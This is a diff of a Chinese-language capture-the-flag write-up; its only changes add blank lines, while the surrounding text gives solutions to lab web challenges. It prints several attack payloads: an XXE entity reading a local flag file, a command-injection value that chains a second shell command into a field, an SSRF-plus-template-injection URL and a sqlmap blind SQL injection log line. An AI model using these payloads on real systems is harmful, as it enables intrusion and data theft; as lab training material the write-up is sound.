@@ -8,6 +8,7 @@ keywords: wp
 ---
 
 ## web1
+
 ![web1.png](https://upload-images.jianshu.io/upload_images/2360187-792c50b7cf167563.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
 右键看源码，得到一段js代码
 
@@ -62,6 +63,7 @@ xxe漏洞，添加xxe poc
 'methodname': '&xxe;', '!DOCTYPE': 'xdsec [<!ELEMENT methodname ANY >\n<!ENTITY xxe SYSTEM "file:///flag" >]'
 ```
 ## web2
+
 命令注入
 
 ![web2.png](https://upload-images.jianshu.io/upload_images/2360187-efc73c902c211a26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
@@ -70,11 +72,13 @@ url编码查看flag
 1.1.1.1 %26%26 head flag
 ```
 ## web3
+
 ssti漏洞
 ![web3.PNG](https://upload-images.jianshu.io/upload_images/2360187-9aa9cf90cbf4961c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
 可以看到有提示http://127.0.0.1:1998，所以应该是ssrf，将后面的url换成127.0.0.1:1988并且利用ssti漏洞，即http://192.168.2.122:8110/?isg=http://127.0.0.1:1998?key={{config}}，经过url编码可得http://192.168.2.122:8110/?isg=http%3A//127.0.0.1%3A1998%3Fkey%3D%7B%7B%2520config%2520%7D%7D，请求得到flag
 
 ## web4
+
 ![web4.PNG](https://upload-images.jianshu.io/upload_images/2360187-745f893f8cd2d8fb.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
 ```
 <?php 
@@ -141,6 +145,7 @@ http://192.168.2.231/web2/?url=http://[::1]/web2/main.php?code=s:11:%22get_flag(
 可以得到flag
 
 ## 日志审计
+
 日志审计是一个基于布尔盲注的题，看其中几个日志信息
 ```
 172.17.0.1 - - [25/Sep/2018:07:13:01  0000] "GET /index.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(session_id AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 1,1),5,1))>96-- bAne HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"
